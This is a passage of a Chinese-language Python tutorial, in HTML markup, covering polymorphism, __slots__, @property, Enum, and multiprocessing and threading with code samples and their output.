class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; run_twice(Animal())</span><br><span class="line">Animal is running...</span><br><span class="line">Animal is running...</span><br></pre></td></tr></table></figure><p>当我们传入<code>Dog</code>的实例时，<code>run_twice()</code>就打印出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; run_twice(Dog())</span><br><span class="line">Dog is running...</span><br><span class="line">Dog is running...</span><br></pre></td></tr></table></figure><p>当我们传入<code>Cat</code>的实例时，<code>run_twice()</code>就打印出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; run_twice(Cat())</span><br><span class="line">Cat is running...</span><br><span class="line">Cat is running...</span><br></pre></td></tr></table></figure><p>看上去没啥意思，但是仔细想想，现在，如果我们再定义一个<code>Tortoise</code>类型，也从<code>Animal</code>派生：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Tortoise(Animal):</span><br><span class="line">    def run(self):</span><br><span class="line">        print(&apos;Tortoise is running slowly...&apos;)</span><br></pre></td></tr></table></figure><p>当我们调用<code>run_twice()</code>时，传入<code>Tortoise</code>的实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; run_twice(Tortoise())</span><br><span class="line">Tortoise is running slowly...</span><br><span class="line">Tortoise is running slowly...</span><br></pre></td></tr></table></figure><p>你会发现，新增一个<code>Animal</code>的子类，不必对<code>run_twice()</code>做任何修改，实际上，任何依赖<code>Animal</code>作为参数的函数或者方法都可以不加修改地正常运行，原因就在于多态。</p><p>多态的好处就是，当我们需要传入<code>Dog</code>、<code>Cat</code>、<code>Tortoise</code>……时，我们只需要接收<code>Animal</code>类型就可以了，因为<code>Dog</code>、<code>Cat</code>、<code>Tortoise</code>……都是<code>Animal</code>类型，然后，按照<code>Animal</code>类型进行操作即可。由于<code>Animal</code>类型有<code>run()</code>方法，因此，传入的任意类型，只要是<code>Animal</code>类或者子类，就会自动调用实际类型的<code>run()</code>方法，这就是多态的意思：</p><p>对于一个变量，我们只需要知道它是<code>Animal</code>类型，无需确切地知道它的子类型，就可以放心地调用<code>run()</code>方法，而具体调用的<code>run()</code>方法是作用在<code>Animal</code>、<code>Dog</code>、<code>Cat</code>还是<code>Tortoise</code>对象上，由运行时该对象的确切类型决定，这就是多态真正的威力：调用方只管调用，不管细节，而当我们新增一种<code>Animal</code>的子类时，只要确保<code>run()</code>方法编写正确，不用管原来的代码是如何调用的。这就是著名的“开闭”原则：</p><p>对扩展开放：允许新增<code>Animal</code>子类；</p><p>对修改封闭：不需要修改依赖<code>Animal</code>类型的<code>run_twice()</code>等函数。</p><p>继承还可以一级一级地继承下来，就好比从爷爷到爸爸、再到儿子这样的关系。而任何类，最终都可以追溯到根类object，这些继承关系看上去就像一颗倒着的树。比如如下的继承树：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">                ┌───────────────┐</span><br><span class="line">                │    object     │</span><br><span class="line">                └───────────────┘</span><br><span class="line">                        │</span><br><span class="line">           ┌────────────┴────────────┐</span><br><span class="line">           │                         │</span><br><span class="line">           ▼                         ▼</span><br><span class="line">    ┌─────────────┐           ┌─────────────┐</span><br><span class="line">    │   Animal    │           │    Plant    │</span><br><span class="line">    └─────────────┘           └─────────────┘</span><br><span class="line">           │                         │</span><br><span class="line">     ┌─────┴──────┐            ┌─────┴──────┐</span><br><span class="line">     │            │            │            │</span><br><span class="line">     ▼            ▼            ▼            ▼</span><br><span class="line">┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐</span><br><span class="line">│   Dog   │  │   Cat   │  │  Tree   │  │ Flower  │</span><br><span class="line">└─────────┘  └─────────┘  └─────────┘  └─────────┘</span><br></pre></td></tr></table></figure><h3 id="面向对象高级编程"><a href="#面向对象高级编程" class="headerlink" title="面向对象高级编程"></a>面向对象高级编程</h3><h4 id="slots"><a href="#slots" class="headerlink" title="__slots__"></a>__slots__</h4><p>正常情况下，当我们定义了一个class，创建了一个class的实例后，我们可以给该实例绑定任何属性和方法，这就是动态语言的灵活性。先定义class：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>然后，尝试给实例绑定一个属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = Student()</span><br><span class="line">&gt;&gt;&gt; s.name = &apos;Michael&apos; # 动态给实例绑定一个属性</span><br><span class="line">&gt;&gt;&gt; print(s.name)</span><br><span class="line">Michael</span><br></pre></td></tr></table></figure><p>还可以尝试给实例绑定一个方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def set_age(self, age): # 定义一个函数作为实例方法</span><br><span class="line">...     self.age = age</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; from types import MethodType</span><br><span class="line">&gt;&gt;&gt; s.set_age = MethodType(set_age, s) # 给实例绑定一个方法</span><br><span class="line">&gt;&gt;&gt; s.set_age(25) # 调用实例方法</span><br><span class="line">&gt;&gt;&gt; s.age # 测试结果</span><br><span class="line">25</span><br></pre></td></tr></table></figure><p>但是，给一个实例绑定的方法，对另一个实例是不起作用的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s2 = Student() # 创建新的实例</span><br><span class="line">&gt;&gt;&gt; s2.set_age(25) # 尝试调用方法</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: &apos;Student&apos; object has no attribute &apos;set_age&apos;</span><br></pre></td></tr></table></figure><p>为了给所有实例都绑定方法，可以给class绑定方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def set_score(self, score):</span><br><span class="line">...     self.score = score</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; Student.set_score = set_score</span><br></pre></td></tr></table></figure><p>给class绑定方法后，所有实例均可调用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s.set_score(100)</span><br><span class="line">&gt;&gt;&gt; s.score</span><br><span class="line">100</span><br><span class="line">&gt;&gt;&gt; s2.set_score(99)</span><br><span class="line">&gt;&gt;&gt; s2.score</span><br><span class="line">99</span><br></pre></td></tr></table></figure><p>通常情况下，上面的<code>set_score</code>方法可以直接定义在class中，但动态绑定允许我们在程序运行的过程中动态给class加上功能，这在静态语言中很难实现。</p><p>但是，如果我们想要限制实例的属性怎么办？比如，只允许对Student实例添加<code>name</code>和<code>age</code>属性。</p><p>为了达到限制的目的，Python允许在定义class的时候，定义一个特殊的<code>__slots__</code>变量，来限制该class实例能添加的属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    __slots__ = (&apos;name&apos;, &apos;age&apos;) # 用tuple定义允许绑定的属性名称</span><br></pre></td></tr></table></figure><p>然后，我们试试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = Student() # 创建新的实例</span><br><span class="line">&gt;&gt;&gt; s.name = &apos;Michael&apos; # 绑定属性&apos;name&apos;</span><br><span class="line">&gt;&gt;&gt; s.age = 25 # 绑定属性&apos;age&apos;</span><br><span class="line">&gt;&gt;&gt; s.score = 99 # 绑定属性&apos;score&apos;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: &apos;Student&apos; object has no attribute &apos;score&apos;</span><br></pre></td></tr></table></figure><p>由于<code>&#39;score&#39;</code>没有被放到<code>__slots__</code>中，所以不能绑定<code>score</code>属性，试图绑定<code>score</code>将得到<code>AttributeError</code>的错误。</p><p>使用<code>__slots__</code>要注意，<code>__slots__</code>定义的属性仅对当前类实例起作用，对继承的子类是不起作用的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class GraduateStudent(Student):</span><br><span class="line">...     pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; g = GraduateStudent()</span><br><span class="line">&gt;&gt;&gt; g.score = 9999</span><br></pre></td></tr></table></figure><p>除非在子类中也定义<code>__slots__</code>，这样，子类实例允许定义的属性就是自身的<code>__slots__</code>加上父类的<code>__slots__</code>。</p><h4 id="property"><a href="#property" class="headerlink" title="@property"></a>@property</h4><p>Python内置的<code>@property</code>装饰器就是负责把一个方法变成属性调用的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    def score(self):</span><br><span class="line">        return self._score</span><br><span class="line"></span><br><span class="line">    @score.setter</span><br><span class="line">    def score(self, value):</span><br><span class="line">        if not isinstance(value, int):</span><br><span class="line">            raise ValueError(&apos;score must be an integer!&apos;)</span><br><span class="line">        if value &lt; 0 or value &gt; 100:</span><br><span class="line">            raise ValueError(&apos;score must between 0 ~ 100!&apos;)</span><br><span class="line">        self._score = value</span><br></pre></td></tr></table></figure><p><code>@property</code>的实现比较复杂，我们先考察如何使用。把一个getter方法变成属性，只需要加上<code>@property</code>就可以了，此时，<code>@property</code>本身又创建了另一个装饰器<code>@score.setter</code>，负责把一个setter方法变成属性赋值，于是，我们就拥有一个可控的属性操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = Student()</span><br><span class="line">&gt;&gt;&gt; s.score = 60 # OK，实际转化为s.set_score(60)</span><br><span class="line">&gt;&gt;&gt; s.score # OK，实际转化为s.get_score()</span><br><span class="line">60</span><br><span class="line">&gt;&gt;&gt; s.score = 9999</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">ValueError: score must between 0 ~ 100!</span><br></pre></td></tr></table></figure><p>注意到这个神奇的<code>@property</code>，我们在对实例属性操作的时候，就知道该属性很可能不是直接暴露的，而是通过getter和setter方法来实现的。</p><p>还可以定义只读属性，只定义getter方法，不定义setter方法就是一个只读属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    def birth(self):</span><br><span class="line">        return self._birth</span><br><span class="line"></span><br><span class="line">    @birth.setter</span><br><span class="line">    def birth(self, value):</span><br><span class="line">        self._birth = value</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    def age(self):</span><br><span class="line">        return 2015 - self._birth</span><br></pre></td></tr></table></figure><p>上面的<code>birth</code>是可读写属性，而<code>age</code>就是一个<em>只读</em>属性，因为<code>age</code>可以根据<code>birth</code>和当前时间计算出来。</p><h4 id="枚举类"><a href="#枚举类" class="headerlink" title="枚举类"></a>枚举类</h4><p>Python提供了<code>Enum</code>类来实现这个功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from enum import Enum</span><br><span class="line"></span><br><span class="line">Month = Enum(&apos;Month&apos;, (&apos;Jan&apos;, &apos;Feb&apos;, &apos;Mar&apos;, &apos;Apr&apos;, &apos;May&apos;, &apos;Jun&apos;, &apos;Jul&apos;, &apos;Aug&apos;, &apos;Sep&apos;, &apos;Oct&apos;, &apos;Nov&apos;, &apos;Dec&apos;))</span><br></pre></td></tr></table></figure><p>这样我们就获得了<code>Month</code>类型的枚举类，可以直接使用<code>Month.Jan</code>来引用一个常量，或者枚举它的所有成员：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for name, member in Month.__members__.items():</span><br><span class="line">    print(name, &apos;=&gt;&apos;, member, &apos;,&apos;, member.value)</span><br></pre></td></tr></table></figure><p><code>value</code>属性则是自动赋给成员的<code>int</code>常量，默认从<code>1</code>开始计数。</p><p>如果需要更精确地控制枚举类型，可以从<code>Enum</code>派生出自定义类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from enum import Enum, unique</span><br><span class="line"></span><br><span class="line">@unique</span><br><span class="line">class Weekday(Enum):</span><br><span class="line">    Sun = 0 # Sun的value被设定为0</span><br><span class="line">    Mon = 1</span><br><span class="line">    Tue = 2</span><br><span class="line">    Wed = 3</span><br><span class="line">    Thu = 4</span><br><span class="line">    Fri = 5</span><br><span class="line">    Sat = 6</span><br></pre></td></tr></table></figure><p><code>@unique</code>装饰器可以帮助我们检查保证没有重复值。</p><h3 id="进程-线程"><a href="#进程-线程" class="headerlink" title="进程 线程"></a>进程 线程</h3><p>多任务实现模式:</p><ul><li>一种是启动多个进程，每个进程虽然只有一个线程，但多个进程可以一块执行多个任务。</li><li>一种方法是启动一个进程，在一个进程内启动多个线程，这样，多个线程也可以一块执行多个任务。</li><li>第三种方法，就是启动多个进程，每个进程再启动多个线程，这样同时执行的任务就更多了，当然这种模型更复杂，实际很少采用。</li></ul><p>总结一下就是，多任务的实现有3种方式：</p><ul><li>多进程模式；</li><li>多线程模式；</li><li>多进程+多线程模式。</li></ul><h4 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h4><p><strong>Unix/Linux操作系统提供了一个<code>fork()</code>系统调用，它非常特殊。普通的函数调用，调用一次，返回一次，但是<code>fork()</code>调用一次，返回两次，因为操作系统自动把当前进程（称为父进程）复制了一份（称为子进程），然后，分别在父进程和子进程内返回。</strong> </p><p>子进程永远返回<code>0</code>，而父进程返回子进程的ID。这样做的理由是，一个父进程可以fork出很多子进程，所以，父进程要记下每个子进程的ID，而子进程只需要调用<code>getppid()</code>就可以拿到父进程的ID。</p><p>Python的<code>os</code>模块封装了常见的系统调用，其中就包括<code>fork</code>，可以在Python程序中轻松创建子进程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">print(&apos;Process (%s) start...&apos; % os.getpid())</span><br><span class="line"># Only works on Unix/Linux/Mac:</span><br><span class="line">pid = os.fork()</span><br><span class="line">if pid == 0:</span><br><span class="line">    print(&apos;I am child process (%s) and my parent is %s.&apos; % (os.getpid(), os.getppid()))</span><br><span class="line">else:</span><br><span class="line">    print(&apos;I (%s) just created a child process (%s).&apos; % (os.getpid(), pid))</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Process (876) start...</span><br><span class="line">I (876) just created a child process (877).</span><br><span class="line">I am child process (877) and my parent is 876.</span><br></pre></td></tr></table></figure><h4 id="Window-multiprocessing"><a href="#Window-multiprocessing" class="headerlink" title="Window multiprocessing"></a>Window multiprocessing</h4><p><strong><code>ultiprocessing</code>模块就是跨平台版本的多进程模块。</strong> </p><p><code>multiprocessing</code>模块提供了一个<code>Process</code>类来代表一个进程对象，下面的例子演示了启动一个子进程并等待其结束：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from multiprocessing import Process</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># 子进程要执行的代码</span><br><span class="line">def run_proc(name):</span><br><span class="line">    print(&apos;Run child process %s (%s)...&apos; % (name, os.getpid()))</span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    print(&apos;Parent process %s.&apos; % os.getpid())</span><br><span class="line">    p = Process(target=run_proc, args=(&apos;test&apos;,))</span><br><span class="line">    print(&apos;Child process will start.&apos;)</span><br><span class="line">    p.start()</span><br><span class="line">    p.join()</span><br><span class="line">    print(&apos;Child process end.&apos;)</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parent process 928.</span><br><span class="line">Process will start.</span><br><span class="line">Run child process test (929)...</span><br><span class="line">Process end.</span><br></pre></td></tr></table></figure><p>创建子进程时，只需要传入一个执行函数和函数的参数，创建一个<code>Process</code>实例，用<code>start()</code>方法启动，这样创建进程比<code>fork()</code>还要简单。</p><p><strong><code>join()</code>方法可以等待子进程结束后再继续往下运行，通常用于进程间的同步。</strong> </p><h4 id="Pool"><a href="#Pool" class="headerlink" title="Pool"></a>Pool</h4><p>启动大量的子进程, 可以用进程池方式批量创建子进程:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from multiprocessing import Pool</span><br><span class="line">import os, time, random</span><br><span class="line"></span><br><span class="line">def long_time_task(name):</span><br><span class="line">    print(&apos;Run task %s (%s)...&apos; % (name, os.getpid()))</span><br><span class="line">    start = time.time()</span><br><span class="line">    time.sleep(random.random() * 3)</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(&apos;Task %s runs %0.2f seconds.&apos; % (name, (end - start)))</span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    print(&apos;Parent process %s.&apos; % os.getpid())</span><br><span class="line">    p = Pool(4)</span><br><span class="line">    for i in range(5):</span><br><span class="line">        p.apply_async(long_time_task, args=(i,))</span><br><span class="line">    print(&apos;Waiting for all subprocesses done...&apos;)</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    print(&apos;All subprocesses done.&apos;)</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Parent process 669.</span><br><span class="line">Waiting for all subprocesses done...</span><br><span class="line">Run task 0 (671)...</span><br><span class="line">Run task 1 (672)...</span><br><span class="line">Run task 2 (673)...</span><br><span class="line">Run task 3 (674)...</span><br><span class="line">Task 2 runs 0.14 seconds.</span><br><span class="line">Run task 4 (673)...</span><br><span class="line">Task 1 runs 0.27 seconds.</span><br><span class="line">Task 3 runs 0.86 seconds.</span><br><span class="line">Task 0 runs 1.41 seconds.</span><br><span class="line">Task 4 runs 1.91 seconds.</span><br><span class="line">All subprocesses done.</span><br></pre></td></tr></table></figure><p>代码解读：</p><p>对<code>Pool</code>对象调用<code>join()</code>方法会等待所有子进程执行完毕，调用<code>join()</code>之前必须先调用<code>close()</code>，调用<code>close()</code>之后就不能继续添加新的<code>Process</code>了。</p><p>请注意输出的结果，task <code>0</code>，<code>1</code>，<code>2</code>，<code>3</code>是立刻执行的，而task <code>4</code>要等待前面某个task完成后才执行，这是因为<code>Pool</code>的默认大小在我的电脑上是4，因此，最多同时执行4个进程。这是<code>Pool</code>有意设计的限制，并不是操作系统的限制。如果改成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = Pool(5)</span><br></pre></td></tr></table></figure><p>就可以同时跑5个进程。</p><p>由于<code>Pool</code>的默认大小是CPU的核数，如果你不幸拥有8核CPU，你要提交至少9个子进程才能看到上面的等待效果。</p><h4 id="子进程-subprocess"><a href="#子进程-subprocess" class="headerlink" title="子进程  subprocess"></a>子进程  subprocess</h4><p>启动一个子进程， 控制其输入和输出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">print(&apos;$ nslookup www.python.org&apos;)</span><br><span class="line">r = subprocess.call([&apos;nslookup&apos;, &apos;www.python.org&apos;])</span><br><span class="line">print(&apos;Exit code:&apos;, r)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ nslookup www.python.org</span><br><span class="line">Server:        192.168.19.4</span><br><span class="line">Address:    192.168.19.4#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">www.python.org    canonical name = python.map.fastly.net.</span><br><span class="line">Name:    python.map.fastly.net</span><br><span class="line">Address: 199.27.79.223</span><br><span class="line"></span><br><span class="line">Exit code: 0</span><br></pre></td></tr></table></figure><h4 id="进程间通讯-Queue-Pipes"><a href="#进程间通讯-Queue-Pipes" class="headerlink" title="进程间通讯  Queue/Pipes"></a>进程间通讯  Queue/Pipes</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from multiprocessing import Process, Queue</span><br><span class="line">import os, time, random</span><br><span class="line"></span><br><span class="line"># 写数据进程执行的代码:</span><br><span class="line">def write(q):</span><br><span class="line">    print(&apos;Process to write: %s&apos; % os.getpid())</span><br><span class="line">    for value in [&apos;A&apos;, &apos;B&apos;, &apos;C&apos;]:</span><br><span class="line">        print(&apos;Put %s to queue...&apos; % value)</span><br><span class="line">        q.put(value)</span><br><span class="line">        time.sleep(random.random())</span><br><span class="line"></span><br><span class="line"># 读数据进程执行的代码:</span><br><span class="line">def read(q):</span><br><span class="line">    print(&apos;Process to read: %s&apos; % os.getpid())</span><br><span class="line">    while True:</span><br><span class="line">        value = q.get(True)</span><br><span class="line">        print(&apos;Get %s from queue.&apos; % value)</span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    # 父进程创建Queue，并传给各个子进程：</span><br><span class="line">    q = Queue()</span><br><span class="line">    pw = Process(target=write, args=(q,))</span><br><span class="line">    pr = Process(target=read, args=(q,))</span><br><span class="line">    # 启动子进程pw，写入:</span><br><span class="line">    pw.start()</span><br><span class="line">    # 启动子进程pr，读取:</span><br><span class="line">    pr.start()</span><br><span class="line">    # 等待pw结束:</span><br><span class="line">    pw.join()</span><br><span class="line">    # pr进程里是死循环，无法等待其结束，只能强行终止:</span><br><span class="line">    pr.terminate()</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Process to write: 50563</span><br><span class="line">Put A to queue...</span><br><span class="line">Process to read: 50564</span><br><span class="line">Get A from queue.</span><br><span class="line">Put B to queue...</span><br><span class="line">Get B from queue.</span><br><span class="line">Put C to queue...</span><br><span class="line">Get C from queue.</span><br></pre></td></tr></table></figure><p>在Unix/Linux下，<code>multiprocessing</code>模块封装了<code>fork()</code>调用，使我们不需要关注<code>fork()</code>的细节。由于Windows没有<code>fork</code>调用，因此，<code>multiprocessing</code>需要“模拟”出<code>fork</code>的效果，父进程所有Python对象都必须通过pickle序列化再传到子进程去，所有，如果<code>multiprocessing</code>在Windows下调用失败了，要先考虑是不是pickle失败了。</p><h4 id="多线程-Threading"><a href="#多线程-Threading" class="headerlink" title="多线程 Threading"></a>多线程 Threading</h4><p>Python的标准库提供了两个模块：<code>_thread</code>和<code>threading</code>，<code>_thread</code>是低级模块，<code>threading</code>是高级模块，对<code>_thread</code>进行了封装。绝大多数情况下，我们只需要使用<code>threading</code>这个高级模块。</p><p>启动一个线程就是把一个函数传入并创建<code>Thread</code>实例，然后调用<code>start()</code>开始执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import time, threading</span><br><span class="line"></span><br><span class="line"># 新线程执行的代码:</span><br><span class="line">def loop():</span><br><span class="line">    print(&apos;thread %s is running...&apos; % threading.current_thread().name)</span><br><span class="line">    n = 0</span><br><span class="line">    while n &lt; 5:</span><br><span class="line">        n = n + 1</span><br><span class="line">        print(&apos;thread %s &gt;&gt;&gt; %s&apos; % (threading.current_thread().name, n))</span><br><span class="line">        time.sleep(1)</span><br><span class="line">    print(&apos;thread %s ended.&apos; % threading.current_thread().name)</span><br><span class="line"></span><br><span class="line">print(&apos;thread %s is running...&apos; % threading.current_thread().name)</span><br><span class="line">t = threading.Thread(target=loop, name=&apos;LoopThread&apos;)</span><br><span class="line">t.start()</span><br><span 